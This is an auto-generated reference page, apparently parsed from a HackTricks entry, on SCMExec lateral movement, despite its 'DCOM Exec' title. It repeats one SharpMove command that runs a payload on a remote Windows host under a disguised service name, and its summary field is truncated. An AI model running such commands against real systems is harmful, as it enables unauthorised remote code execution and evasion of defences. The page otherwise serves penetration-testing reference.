---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# DCOM Exec

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-windows-hardening-lateral-movement-scmexec` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/windows-hardening/lateral-movement/scmexec.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

SCMExec is a technique to execute commands on remote systems using the Service Control Manager (SCM) to create a service that runs the command. This method can bypass some security controls, such as User Account Control (UAC) and Windows De

## Preserved Body

```markdown
## SCM

**SCMExec** is a technique to execute commands on remote systems using the Service Control Manager (SCM) to create a service that runs the command. This method can bypass some security controls, such as User Account Control (UAC) and Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## Source Verification

[source record](../../sources/hacktricks/dcom-exec.md)

## Evidence Excerpt

```text
_body: '# DCOM Exec
{{#include ../../banners/hacktricks-training.md}}
## SCM
**SCMExec** is a technique to execute commands on remote systems using the Service Control Manager (SCM) to create a service
that runs the command. This method can bypass some security controls, such as User Account Control (UAC) and Windows Defender.
## Tools
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```
